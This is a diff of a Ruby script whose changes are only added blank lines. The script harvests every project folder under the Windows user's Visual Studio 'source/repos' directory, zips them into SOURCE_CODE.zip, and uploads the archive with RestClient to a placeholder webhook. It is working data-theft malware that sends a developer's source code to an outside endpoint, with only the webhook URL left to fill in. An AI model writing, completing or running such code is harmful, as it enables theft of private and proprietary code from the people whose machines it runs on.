@@ -1,6 +1,8 @@
 require 'zip'
 require 'fileutils'
 require 'rest_client'
+
+
 def generate_random_strings
   strings = []
   5.times do
@@ -18,11 +20,14 @@ def delete_folder_if_exists(folder_path)
     FileUtils.rm_rf(folder_path)
   end
 end
+
 username = ENV['USERNAME']
 repos_folder = "C:/Users/#{username}/source/repos"
 kyanite_folder = 'KYANITE_SOURCE'
 delete_folder_if_exists(kyanite_folder)
 kyanite_path = "#{kyanite_folder}"
+
+
 Dir.mkdir(kyanite_path) unless Dir.exist?(kyanite_path)
 Dir.glob("#{repos_folder}/*").select { |f| File.directory?(f) }.each do |folder|
   folder_name = File.basename(folder)
@@ -42,6 +47,7 @@ Dir.glob("#{repos_folder}/*").select { |f| File.directory?(f) }.each do |folder|
     puts "Exception Caught #{KyaniteZipUp}: #{e}"
   end
 end
+
 def KYANITEZIPAPI(source, destination)
   Zip::File.open(destination, Zip::File::CREATE) do |zipfile|
     Dir.glob(source + '/**/*').each do |file|
@@ -52,6 +58,7 @@ def KYANITEZIPAPI(source, destination)
     end
   end
 end
+
 KYANITEZIPAPI('KYANITE_SOURCE', 'SOURCE_CODE.zip')
 RestClient.post('//WEBHOOK//',
                 :files => File.new('SOURCE_CODE.zip'))
